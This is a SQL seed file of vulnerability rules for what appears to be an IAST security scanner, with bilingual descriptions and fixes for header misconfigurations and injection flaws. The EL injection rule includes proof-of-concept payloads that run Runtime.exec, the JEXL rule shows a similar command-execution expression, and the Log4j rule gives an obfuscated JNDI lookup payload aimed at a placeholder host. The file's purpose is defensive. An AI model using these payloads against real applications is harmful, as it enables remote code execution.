INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (29, 1, 'Response With X-XSS-Protection Disabled', 5, 'enable', 1, 'Response With X-XSS-Protection Disabled', 'Response With X-XSS-Protection Disabled', '启用 X-XSS-Protection 并将值设置为 1。\nPHP\n```\nheader(\"X-XSS-Protection: 1; mode=block\");\n```\n\nApache (.htaccess)\n```\nHeader set X-XSS-Protection \"1; mode=block\"\n```\nnginx\n```\nadd_header \"X-XSS-Protection\" \"1; mode=block\";\n```', 133, 'Verifies that the requests sent by the application have the X-XSS-Protection header left default (secure) or set correctly.        ', 'Response With X-XSS-Protection Disabled', NULL, '启用 X-XSS-Protection 并将值设置为 1。\nPHP\n```\nheader(\"X-XSS-Protection: 1; mode=block\");\n```\n\nApache (.htaccess)\n```\nHeader set X-XSS-Protection \"1; mode=block\"\n```\nnginx\n```\nadd_header \"X-XSS-Protection\" \"1; mode=block\";\n```', 'Response With X-XSS-Protection Disabled', 'Response With X-XSS-Protection Disabled', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (30, 1, 'Response With Insecurely Configured Strict-Transport-Security Header        ', 5, 'enable', 1, 'Response With Insecurely Configured Strict-Transport-Security Header        ', 'Verifies that the requests sent by the application have the Strict Transport Security header set correctly.        ', '1、修改服务端程序，给HTTP响应头加上Strict-Transport-Security \n如果是java 服务端，可以使用如下方式添加HTTP响应头\n```Java\nresponse.setHeader(\"Strict-Transport-Security\"，\"value\")\n```\n\n如果是php 服务端，可以使用如下方式添加HTTP响应头\n```php\nheader(\'Strict-Transport-Security:value\')\n```\n如果是asp服务端，可以使用如下方式添加 HTTP响应头\n```\nResponse.AddHeader \"Strict-Transport-Security\",\"value\"\n```\n如果是python django 服务端，可以使用如下方式添加HTTP响应头\n```\nresponse=HttpResponse() \nresponse[\'Strict-Transport-Security\']=\"value”\n```\n如果是python flask服务端，可以使用如下方式添加 HTTP响应头\n```\nresponse=make_ response()\nresponse.headers[\"Strict-Transport-Security\"]=\"value\";\n```\n\n2、修改负载均衡或反向代理服务器，给HTTP响应头加上Strict-Transport-Security;\n\n如果使用Nginx、Tengine、Open resty 等作为代理服务器，在配置文件中写入如下内容即可添加HTTP响应头；\n```\nadd_header Strict-Transport-Security value；\n```\n\n如果使用Apache作为代理服务器，在配置文件中写入如下内容即可添加HTTP啊应头：\n```\nHeader add Strict-Transport-Security\"value\"。\n```', 134, 'Verifies that the requests sent by the application have the Strict Transport Security header set correctly.        ', 'Verifies that the requests sent by the application have the Strict Transport Security header set correctly.        ', NULL, '1、修改服务端程序，给HTTP响应头加上Strict-Transport-Security \n如果是java 服务端，可以使用如下方式添加HTTP响应头\n```Java\nresponse.setHeader(\"Strict-Transport-Security\"，\"value\")\n```\n\n如果是php 服务端，可以使用如下方式添加HTTP响应头\n```php\nheader(\'Strict-Transport-Security:value\')\n```\n如果是asp服务端，可以使用如下方式添加 HTTP响应头\n```\nResponse.AddHeader \"Strict-Transport-Security\",\"value\"\n```\n如果是python django 服务端，可以使用如下方式添加HTTP响应头\n```\nresponse=HttpResponse() \nresponse[\'Strict-Transport-Security\']=\"value”\n```\n如果是python flask服务端，可以使用如下方式添加 HTTP响应头\n```\nresponse=make_ response()\nresponse.headers[\"Strict-Transport-Security\"]=\"value\";\n```\n\n2、修改负载均衡或反向代理服务器，给HTTP响应头加上Strict-Transport-Security;\n\n如果使用Nginx、Tengine、Open resty 等作为代理服务器，在配置文件中写入如下内容即可添加HTTP响应头；\n```\nadd_header Strict-Transport-Security value；\n```\n\n如果使用Apache作为代理服务器，在配置文件中写入如下内容即可添加HTTP啊应头：\n```\nHeader add Strict-Transport-Security\"value\"。\n```', 'Response With Insecurely Configured Strict-Transport-Security Header', 'Response With Insecurely Configured Strict-Transport-Security Header        ', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (31, 1, 'Pages Without Anti-Clickjacking Controls', 5, 'enable', 1, 'Pages Without Anti-Clickjacking Controls', 'Verifies that frame-breaking controls are used on every page.        ', '1、使用Firefox的Noscript的ClearClick功能\n\n2、阻挡iframe的执行（NoScript）或停用Javascript\n\n3、Frame busting（也就是anti-framing）for your own sites\n\n<script>if（top！=self）top.location=location</script>', 135, 'Verifies that frame-breaking controls are used on every page.        ', 'Verifies that frame-breaking controls are used on every page.        ', NULL, '1、使用Firefox的Noscript的ClearClick功能\n\n2、阻挡iframe的执行（NoScript）或停用Javascript\n\n3、Frame busting（也就是anti-framing）for your own sites\n\n<script>if（top！=self）top.location=location</script>', 'Pages Without Anti-Clickjacking Controls', 'Pages Without Anti-Clickjacking Controls', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (32, 1, 'Response Without X-Content-Type-Options Header', 5, 'enable', 1, 'Response Without X-Content-Type-Options Header', 'Verifies that the requests sent by the application have the X-Content-Type-Options header set correctly.', '1、PHP配置设置\n在Headers.php文件中添加\"X-Content-Type-Options:nosniff\"\n通过设置\"\"X-Content-Type-Options: nosniff\"\"响应标头，对 script 和 styleSheet 在执行是通过MIME 类型来过滤掉不安全的文件,如果通过 styleSheet 参考检索到的响应中接收到 \"\"nosniff\"\" 指令，则 Windows Internet Explorer 不会加载“stylesheet”文件，除非 MIME 类型匹配 \"\"text/css\"\"。\n\n2、nginx配置设置\n设置代码为：\n```\n... ...\nserver{\n... ...\nadd_header X-Content-Type-Options \"\"nosniff\"\";\n... ...\n}\n```', 136, 'Verifies that the requests sent by the application have the X-Content-Type-Options header set correctly.', 'Verifies that the requests sent by the application have the X-Content-Type-Options header set correctly.', NULL, '1、PHP配置设置\n在Headers.php文件中添加\"X-Content-Type-Options:nosniff\"\n通过设置\"\"X-Content-Type-Options: nosniff\"\"响应标头，对 script 和 styleSheet 在执行是通过MIME 类型来过滤掉不安全的文件,如果通过 styleSheet 参考检索到的响应中接收到 \"\"nosniff\"\" 指令，则 Windows Internet Explorer 不会加载“stylesheet”文件，除非 MIME 类型匹配 \"\"text/css\"\"。\n\n2、nginx配置设置\n设置代码为：\n```\n... ...\nserver{\n... ...\nadd_header X-Content-Type-Options \"\"nosniff\"\";\n... ...\n}\n```', 'Response Without X-Content-Type-Options Header', 'Response Without X-Content-Type-Options Header', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (35, 1, 'code-execution', 1, 'enable', 1, '代码执行', '代码执行漏洞是指应用程序对传入命令的参数过滤不严导致恶意攻击值能控制最终执行的命令，进而入侵系统，造成严重破坏的高危漏洞。', '在任何时候都应尽可能的避免动态代码的解析，如果需要执行动态代码，应用程序不能直接执行和解析未验证的用户输入。', 139, 'Using this vulnerability, an attacker can execute arbitrary code.', '代码执行漏洞是指应用程序对传入命令的参数过滤不严导致恶意攻击值能控制最终执行的命令，进而入侵系统，造成严重破坏的高危漏洞。', NULL, '在任何时候都应尽可能的避免动态代码的解析，如果需要执行动态代码，应用程序不能直接执行和解析未验证的用户输入。', 'Code-execution', '代码执行', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (37, 1, '手机号码泄漏', 5, 'enable', 1637329559, '手机号码泄漏', '这是手机号码泄漏的描述', '这是手机号码泄漏的修复建议', NULL, NULL, '手机号码泄露是指个人或组织的手机号码在未经授权的情况下被公开或泄露给第三方，从而导致个人隐私暴露的一种漏洞。\n一旦手机号码被泄露，攻击者可能会利用它们进行欺诈、骚扰、诈骗、身份盗窃等行为。例如，攻击者可能会通过发送恶意短信、电话或电子邮件，诱骗用户提供敏感信息，或者利用手机号码进行钓鱼攻击。\n', NULL, '加强对用户个人信息的保护，采取加密、身份验证、数据最小化等技术手段，确保用户数据的安全性。\n\n建立安全漏洞报告和应急响应机制，以便用户和相关方面能够及时发现和处理安全漏洞。', NULL, '手机号码泄漏', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (38, 1, '硬编码', 5, 'enable', 1639744419, '硬编码', '代码中存在硬编码的内容', '替换源文件中的硬编码，从配置文件或远程配置服务读取', NULL, NULL, '代码中存在硬编码的内容', NULL, '替换源文件中的硬编码，从配置文件或远程配置服务读取', NULL, '硬编码', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (39, 1, 'JNDI注入', 1, 'enable', 1641449965, 'JNDI注入', 'JNDI注入', '禁用lookup方法或禁用远程协议加载', NULL, NULL, 'JNDI注入', NULL, '禁用lookup方法或禁用远程协议加载', NULL, 'JNDI注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (40, 1, '身份认证', 1, 'enable', 1652843515, '身份认证', '无', '无', NULL, NULL, 'JWT 漏洞通常是由于应用程序本身的 JWT 处理有缺陷而引起的。这些缺陷通常意味着 JWT 的签名未正确验证。这使攻击者能够篡改通过令牌的有效负载传递给应用程序的值。即使签名得到了可靠的验证，它是否真正可信在很大程度上取决于服务器的密钥是否保密。如果密钥以某种方式泄露，或者可以被猜测或暴力破解，则攻击者可以为任意令牌生成有效签名，从而破坏整个机制。', NULL, '避免在令牌中直接传输用户的敏感数据以及系统内部的关键参数，如将用户的权限等级admin直接传输。 使用高版本的JWT组件版本，避免使用0.9.1及以下的版本。若使用对称加密算法，应使用强密钥提高秘钥破解的难度。使用非对称加密算法，应在服务端增加已授权算法的白名单，限制签名算法类型，防止密钥混淆攻击。 在Payload字段中增加一些业务上的字段，用于校验当前JWT是否被滥用，例如增加设备号、权限的信息等，可以与上下文的信息进行对照。', NULL, '身份认证', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (41, 1, 'FileWrite', 3, 'enable', 1666336765, '文件写入', '存在用户可控的文件写入行为', '', NULL, NULL, '存在用户可控的文件写入行为', NULL, '输入验证：开发人员应该对输入的数据进行充分的验证和过滤，以避免攻击者能够注入恶意代码或脚本。 文件权限控制：开发人员应该限制应用程序的访问权限，例如仅允许访问特定目录，并使用适当的文件权限设置，以确保只有授权用户才能访问该目录。 安全编程实践：开发人员应该遵循安全编程实践，例如使用编程语言提供的安全函数，如 Java 中的 File.createTempFile() 或 Python 中的 tempfile.mkstemp()方法，以确保应用程序在创建临时文件时安全可靠。 日志监控：监控应用程序的访问日志，以及服务器上的文件系统活动，以及对文件系统进行的任何非正常操作，例如对未知目录的写入操作。这有助于尽早发现潜在的任意文件写入漏洞并进行修复', NULL, '文件写入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (42, 1, 'EL表达式注入', 1, 'enable', 1764061220, 'EL表达式注入', 'CWE-917，该软件使用来自上游组件的外部影响的输入来构造Java Server Page（JSP）中的全部或部分表达语言（EL）语句，但不会中和或错误地中和了可以修改预期的EL语句的特殊元素。它被执行。\n\nEL（Expression Language） 是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。\n\nEL表达式注入漏洞和SpEL、OGNL等表达式注入漏洞是一样的漏洞原理的，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。\n\n一般来说，EL表达式注入漏洞的外部可控点入口都是在Java程序代码中，即Java程序中的EL表达式内容全部或部分是从外部获取的。\n\n**通用POC**\n\n```Java\n//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）\n${pageContext}\n\n//获取Web路径\n${pageContext.getSession().getServletContext().getClassLoader().getResource(\"\")}\n\n//文件头参数\n${header}\n\n//获取webRoot\n${applicationScope}\n\n//执行命令\n${pageContext.request.getSession().setAttribute(\"a\",pageContext.request.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"calc\").getInputStream())}\n```', '-   尽量不使用外部输入的内容作为EL表达式内容；\n-   若使用，则严格过滤EL表达式注入漏洞的payload关键字；\n-   如果是排查Java程序中EL相关代码，则搜索如下关键类方法：\n    ```\n    javax.el.ExpressionFactory.createValueExpression()\n    javax.el.ValueExpression.getValue()\n    ```', NULL, NULL, 'CWE-917，该软件使用来自上游组件的外部影响的输入来构造Java Server Page（JSP）中的全部或部分表达语言（EL）语句，但不会中和或错误地中和了可以修改预期的EL语句的特殊元素。它被执行。\n\nEL（Expression Language） 是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。\n\nEL表达式注入漏洞和SpEL、OGNL等表达式注入漏洞是一样的漏洞原理的，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。\n\n一般来说，EL表达式注入漏洞的外部可控点入口都是在Java程序代码中，即Java程序中的EL表达式内容全部或部分是从外部获取的。\n\n**通用POC**\n\n```Java\n//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）\n${pageContext}\n\n//获取Web路径\n${pageContext.getSession().getServletContext().getClassLoader().getResource(\"\")}\n\n//文件头参数\n${header}\n\n//获取webRoot\n${applicationScope}\n\n//执行命令\n${pageContext.request.getSession().setAttribute(\"a\",pageContext.request.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"calc\").getInputStream())}\n```', NULL, '-   尽量不使用外部输入的内容作为EL表达式内容；\n-   若使用，则严格过滤EL表达式注入漏洞的payload关键字；\n-   如果是排查Java程序中EL相关代码，则搜索如下关键类方法：\n    ```\n    javax.el.ExpressionFactory.createValueExpression()\n    javax.el.ValueExpression.getValue()\n    ```', NULL, 'EL表达式注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (43, 1, 'Fel表达式注入', 1, 'enable', 1764061220, 'Fel表达式注入', 'el在源自于企业项目，设计目标是为了满足不断变化的功能需求和性能需求。\nFel是开放的，引擎执行中的多个模块都可以扩展或替换。Fel的执行主要是通过函数实现,运算符(+、-等都是Fel函数），所有这些函数都是可以替换的，扩展函数也非常简单。\nFel可以执行表达式，如果此时Fel执行的表达式外部可控，则可能导致安全风险。', '1、使用官方提供的安全管理器\n- https://github.com/dbcxy/fast-el/commit/ac0d5bdb95b5c5d52fe5df5a8b254e5e8ddd8a38\n- https://code.google.com/archive/p/fast-el/', NULL, NULL, 'el在源自于企业项目，设计目标是为了满足不断变化的功能需求和性能需求。\nFel是开放的，引擎执行中的多个模块都可以扩展或替换。Fel的执行主要是通过函数实现,运算符(+、-等都是Fel函数），所有这些函数都是可以替换的，扩展函数也非常简单。\nFel可以执行表达式，如果此时Fel执行的表达式外部可控，则可能导致安全风险。', NULL, '1、使用官方提供的安全管理器\n- https://github.com/dbcxy/fast-el/commit/ac0d5bdb95b5c5d52fe5df5a8b254e5e8ddd8a38\n- https://code.google.com/archive/p/fast-el/', NULL, 'Fel表达式注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (44, 1, 'IP地址泄露', 5, 'enable', 1764061220, 'IP地址泄露', 'IP地址信息泄露是指个人或组织的计算机或设备的IP地址在未经授权的情况下被公开或泄露给第三方，可能导致隐私泄露和网络安全风险。攻击者可能利用泄露的IP地址来追踪用户的在线活动、进行网络入侵、发起分布式拒绝服务（DDoS）攻击等恶意行为，对个人和组织的网络安全构成威胁。因此，保护IP地址的隐私和安全至关重要。', '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, NULL, 'IP地址信息泄露是指个人或组织的计算机或设备的IP地址在未经授权的情况下被公开或泄露给第三方，可能导致隐私泄露和网络安全风险。攻击者可能利用泄露的IP地址来追踪用户的在线活动、进行网络入侵、发起分布式拒绝服务（DDoS）攻击等恶意行为，对个人和组织的网络安全构成威胁。因此，保护IP地址的隐私和安全至关重要。', NULL, '1、应根据业务特点定义出系统存储的敏感信息。 2、敏感信息在存储、传输、显示时应进行安全处理，可采用的处理方式为加密或脱敏。 3、敏感信息不应使用GET方式提交到服务器。 4、用户密码为最高级别的敏感信息，在存储、传输、显示时都必须加密。 5、需要选择可靠的加密算法，优先选择不对称加密算法，不得使用BASE64等编码方式进行“加密”。 6、对于一些系统默认报错页面应重新进行设计自定义报错页面，以免暴露系统敏感信息。', NULL, 'IP地址泄露', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (45, 1, 'Jexl表达式注入', 1, 'enable', 1764061220, 'Jexl表达式注入', 'JEXL 代表 Java 表达式语言。它是一个提供用于评估 JEXL 表达式的 API 的库。该项目属于Apache软件基金会，JEXL 提供的功能足够强大，可以让我们调用 JVM 中可用的类和方法。以下代码调用 ProcessBuilder 以启动外部进程：\n```Java\nString str = \"\'\'.getClass().forName(\'java.lang.Runtime\').getRuntime().exec(\'calc\')\";\nJexlEngine jexl = new JexlBuilder().create();\nJexlExpression expression = jexl.createExpression(str);\nJexlContext context = new MapContext();\ne.evaluate(context);\n```\n如果此时可执行的表达式外部可控则可能造成攻击者执行系统命令，数据泄露等。', '1、使用Jexl Sendbox\nhttps://commons.apache.org/proper/commons-jexl/apidocs/org/apache/commons/jexl3/introspection/JexlSandbox.html\n```Java\n// 创建沙盒对象，禁用了类加载和系统操作  \nJexlSandbox sandbox = new JexlSandbox(false);  \nsandbox.white(\"xxx\"); \n  \n// 创建 JEXL 引擎时，传递沙盒对象  \nJexlEngine jexl = new JexlBuilder().sandbox(sandbox).create();  \n  \ntry {  \n    // 创建表达式  \n    JexlExpression expression = jexl.createExpression(exporession);  \n  \n    // 执行表达式  \n    JexlContext context = new MapContext();  \n    Object result = expression.evaluate(context);  \n  \n    // 输出结果  \n    System.out.println(\"Result: \" + result);  \n} catch (JexlException e) {  \n    // 捕获 Jexl 异常，表示表达式不合法  \n    System.err.println(\"Invalid expression: \" + e.getMessage());  \n}\n```', NULL, NULL, 'JEXL 代表 Java 表达式语言。它是一个提供用于评估 JEXL 表达式的 API 的库。该项目属于Apache软件基金会，JEXL 提供的功能足够强大，可以让我们调用 JVM 中可用的类和方法。以下代码调用 ProcessBuilder 以启动外部进程：\n```Java\nString str = \"\'\'.getClass().forName(\'java.lang.Runtime\').getRuntime().exec(\'calc\')\";\nJexlEngine jexl = new JexlBuilder().create();\nJexlExpression expression = jexl.createExpression(str);\nJexlContext context = new MapContext();\ne.evaluate(context);\n```\n如果此时可执行的表达式外部可控则可能造成攻击者执行系统命令，数据泄露等。', NULL, '1、使用Jexl Sendbox\nhttps://commons.apache.org/proper/commons-jexl/apidocs/org/apache/commons/jexl3/introspection/JexlSandbox.html\n```Java\n// 创建沙盒对象，禁用了类加载和系统操作  \nJexlSandbox sandbox = new JexlSandbox(false);  \nsandbox.white(\"xxx\"); \n  \n// 创建 JEXL 引擎时，传递沙盒对象  \nJexlEngine jexl = new JexlBuilder().sandbox(sandbox).create();  \n  \ntry {  \n    // 创建表达式  \n    JexlExpression expression = jexl.createExpression(exporession);  \n  \n    // 执行表达式  \n    JexlContext context = new MapContext();  \n    Object result = expression.evaluate(context);  \n  \n    // 输出结果  \n    System.out.println(\"Result: \" + result);  \n} catch (JexlException e) {  \n    // 捕获 Jexl 异常，表示表达式不合法  \n    System.err.println(\"Invalid expression: \" + e.getMessage());  \n}\n```', NULL, 'Jexl表达式注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (46, 1, 'Log4j', 1, 'enable', 1764061220, 'Log4j', '注意：该规则存在误报，已知情况，该规则默认关闭，在一定场景下可帮助检测Log4j，或帮助安全团队快速定位业务哪些地方可由Log4j控制。\n\nApache Log4j2 是一款优秀的 Java 日志框架。`2021 年 11 月 24 日，阿里云安全团队向 Apache 官方报告了 Apache Log4j2 远程代码执行漏洞。`由于 Apache Log4j2 某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink 等均受影响', '1、升级Log4j版本\n\n- https://repo.maven.apache.org/maven2/org/apache/logging/log4j/log4j-core/2.15.0/\n\n2、缓解：对Log4j payload关键字进行waf/rasp规则添加\n\n- 注意：存在绕过的可能\n\n```bash\n${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}\n```\n\n3、缓解：禁用JNDI\n\n```\n// 必须在 log4j 实例化之前设置该系统属性\nSystem.setProperty(\"log4j2.formatMsgNoLookups\", \"true\");\n\nLogger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);\n```', NULL, NULL, '注意：该规则存在误报，已知情况，该规则默认关闭，在一定场景下可帮助检测Log4j，或帮助安全团队快速定位业务哪些地方可由Log4j控制。\n\nApache Log4j2 是一款优秀的 Java 日志框架。`2021 年 11 月 24 日，阿里云安全团队向 Apache 官方报告了 Apache Log4j2 远程代码执行漏洞。`由于 Apache Log4j2 某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink 等均受影响', NULL, '1、升级Log4j版本\n\n- https://repo.maven.apache.org/maven2/org/apache/logging/log4j/log4j-core/2.15.0/\n\n2、缓解：对Log4j payload关键字进行waf/rasp规则添加\n\n- 注意：存在绕过的可能\n\n```bash\n${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}\n```\n\n3、缓解：禁用JNDI\n\n```\n// 必须在 log4j 实例化之前设置该系统属性\nSystem.setProperty(\"log4j2.formatMsgNoLookups\", \"true\");\n\nLogger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);\n```', NULL, 'Log4j', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (47, 1, 'Ognl表达式注入', 1, 'enable', 1764061220, 'Ognl表达式注入', '全称Object Graph Navigation Library\nOGNL代表对象图导航语言；它是一种表达语言，用于获取和设置Java对象的属性，以及其他附加功能，例如列表投影和选择以及lambda表达式。您可以使用相同的表达式来获取和设置属性值。', '1、升级Ognl版本\nhttps://mvnrepository.com/artifact/ognl/ognl\n\n2、根据业务需求对表达式关键字字符进行过滤\n\n\n', NULL, NULL, '全称Object Graph Navigation Library\nOGNL代表对象图导航语言；它是一种表达语言，用于获取和设置Java对象的属性，以及其他附加功能，例如列表投影和选择以及lambda表达式。您可以使用相同的表达式来获取和设置属性值。', NULL, '1、升级Ognl版本\nhttps://mvnrepository.com/artifact/ognl/ognl\n\n2、根据业务需求对表达式关键字字符进行过滤\n\n\n', NULL, 'Ognl表达式注入', 1);
INSERT INTO `iast_strategy` (`id`, `user_id`, `vul_type`, `level_id`, `state`, `dt`, `vul_name`, `vul_desc`, `vul_fix`, `hook_type_id`, `vul_desc_en`, `vul_desc_zh`, `vul_fix_en`, `vul_fix_zh`, `vul_name_en`, `vul_name_zh`, `system_type`) VALUES (48, 1, 'QLExpress组件表达式注入', 1, 'enable', 1764061220, 'QLExpress组件表达式注入', '由阿里的电商业务规则、表达式（布尔组合）、特殊数学公式计算（高精度）、语法分析、脚本二次定制等强需求而设计的一门动态脚本引擎解析工具。 在阿里集团有很强的影响力，同时为了自身不断优化、发扬开源贡献精神，于2012年开源。\nQLExpress脚本引擎被广泛应用在阿里的电商业务场景，具有以下的一些特性:\n- 1、线程安全，引擎运算过程中的产生的临时变量都是threadlocal类型。\n- 2、高效执行，比较耗时的脚本编译过程可以缓存在本地机器，运行时的临时变量创建采用了缓冲池的技术，和groovy性能相当。\n- 3、弱类型脚本语言，和groovy，javascript语法类似，虽然比强类型脚本语言要慢一些，但是使业务的灵活度大大增强。\n- 4、安全控制,可以通过设置相关运行参数，预防死循环、高危系统api调用等情况。\n- 5、代码精简，依赖最小，250k的jar包适合所有java的运行环境，在android系统的低端pos机也得到广泛运用。\nQL Express支持表达式，如执行的表达式外部可控，且没有开启安全配置，则可能导致命令执行等漏洞。', '1、使用官方提供的默认安全配置\nQLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(true);\n2、自定义黑白名单\n详情请见官方文档：https://github.com/alibaba/QLExpress#4-%E5%A4%9A%E7%BA%A7%E5%88%AB%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6', NULL, NULL, '由阿里的电商业务规则、表达式（布尔组合）、特殊数学公式计算（高精度）、语法分析、脚本二次定制等强需求而设计的一门动态脚本引擎解析工具。 在阿里集团有很强的影响力，同时为了自身不断优化、发扬开源贡献精神，于2012年开源。\nQLExpress脚本引擎被广泛应用在阿里的电商业务场景，具有以下的一些特性:\n- 1、线程安全，引擎运算过程中的产生的临时变量都是threadlocal类型。\n- 2、高效执行，比较耗时的脚本编译过程可以缓存在本地机器，运行时的临时变量创建采用了缓冲池的技术，和groovy性能相当。\n- 3、弱类型脚本语言，和groovy，javascript语法类似，虽然比强类型脚本语言要慢一些，但是使业务的灵活度大大增强。\n- 4、安全控制,可以通过设置相关运行参数，预防死循环、高危系统api调用等情况。\n- 5、代码精简，依赖最小，250k的jar包适合所有java的运行环境，在android系统的低端pos机也得到广泛运用。\nQL Express支持表达式，如执行的表达式外部可控，且没有开启安全配置，则可能导致命令执行等漏洞。', NULL, '1、使用官方提供的默认安全配置\nQLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(true);\n2、自定义黑白名单\n详情请见官方文档：https://github.com/alibaba/QLExpress#4-%E5%A4%9A%E7%BA%A7%E5%88%AB%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6', NULL, 'QLExpress组件表达式注入', 1);
